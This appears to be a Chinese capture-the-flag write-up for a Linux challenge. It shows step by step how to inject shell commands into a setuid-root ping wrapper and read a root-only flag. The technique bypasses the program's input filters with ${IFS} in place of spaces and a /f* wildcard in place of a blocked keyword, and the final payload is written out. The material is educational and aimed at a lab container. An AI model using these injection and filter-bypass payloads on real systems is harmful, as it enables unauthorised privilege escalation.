# 「Linux之旅」Writeup 

# 题目信息

**题目名：**Linux 之旅　**类型：**动态Web题

**核心考点：**Linux基础命令操作 \+ setuid程序命令注入提权，需要用Bash特殊语法绕过输入过滤读取flag。

**题目提示：**开始先引导你学完所有Linux基础命令，最后用Shell特殊语法绕过进行提权。

# 环境和依赖

**靶机环境：**题目提供一个在线 Web 终端，以普通用户（uid=1000）登录一个 Linux Docker 容器，无需本地配置虚拟机。

**本地工具：**

- 现代浏览器（Chrome / Firefox），用于打开题目页面与 Web 终端。

- 熟悉 Linux 常用命令行操作即可，无需额外安装渗透测试工具。

**前置知识：**

- Linux 文件权限与 setuid 位（s 位）的作用。

- Shell 命令拼接、分号分隔与变量替换（$\{IFS\}、通配符 \*）。

- system\(\) 函数调用 shell 的基本原理。

# 第二步：发现真正的目标

题目要求找到flag

**第一步：看看自己当前目录里藏了什么文件**

```bash
ls -la
```

回车之后能看到当前目录里有个叫`notes.txt`的文件，我们直接打开看：

```bash
cat notes.txt
```

看完备忘拿到两个关键信息：① 系统里有个root装的诊断工具`/usr/local/bin/pingx`；② 根目录下的`/flag`是400权限，只有root能读，而我们登录的是普通用户。

**第二步：验证是不是真的读不了flag**

```bash
cat /flag
```

回车直接报错`Permission denied`，普通用户身份根本碰不到flag，必须想办法借root的权限读它。

**第三步：确认自己当前的权限身份**

```bash
id
```

输出显示我们是uid=1000的普通用户，不是root，没权限直接读文件。

**第四步：看看那个pingx工具为什么能帮我们拿到root权限**

```bash
ls -l /usr/local/bin/pingx
```

输出里注意看权限位：`-rwsr-xr-x`，其他执行位的位置上不是x，是个s——这就是setuid位：不管谁运行这个程序，程序跑起来的时候都会临时切换成文件所有者（这里所有者是root）的身份，这就是整道题的提权入口。

**思路：想办法通过pingx这个root权限程序，让它帮我们以root身份把/flag读出来。**

# 第三步：逆向 pingx 并构造绕过

既然pingx是以root权限运行的，直接在参数里拼命令，把cat /flag接在ping后面，先试试能不能直接拿到flag：

```bash
pingx "127.0.0.1; cat /flag"
```

回车之后直接被程序拦下来，屏幕弹出提示：检测到非法字符（空格），请求已拦截。

把cat和/flag之间的空格去掉，再试一次：

```bash
pingx "127.0.0.1;cat/flag"
```

屏幕弹出提示：检测到敏感关键字flag，请求已拦截。参数里不能出现连续的"flag"四个字母。

直接从pingx二进制的明文字符串里确认完整逻辑：

```bash
cat /usr/local/bin/pingx | grep -a -i -E "ping|waf|space|flag"
```

从输出的乱码里得到关键信息：程序会把传的参数直接拼在\`ping \-c 4 \`后面，以root身份丢给shell执行；参数含空格就拦截，参数含flag字符串就拦截。

## 绕过思路

- 使用POSIX标准内置变量`${IFS}`代替空格。注意本环境system\(\)调用的是dash而非bash：`cat</f*`写法会因为dash不展开重定向后通配符报错；`{cat,/f*}`是bash独有大括号展开语法，dash不支持也会报错，只有`${IFS}`是跨shell兼容的稳定写法。

- 使用shell通配符`/f*`指代目标文件。shell做命令行参数展开时，会自动匹配到根目录下唯一的f开头文件/flag，输入串里全程不出现连续的flag四字母，绕过关键字检测。

- 用单引号把整段注入内容包裹成一个完整参数，避免本地shell提前把分号拆成两条命令，确保整段内容原封不动传入pingx内部。

## 最终 Payload

```bash
pingx ';cat${IFS}/f*'
```
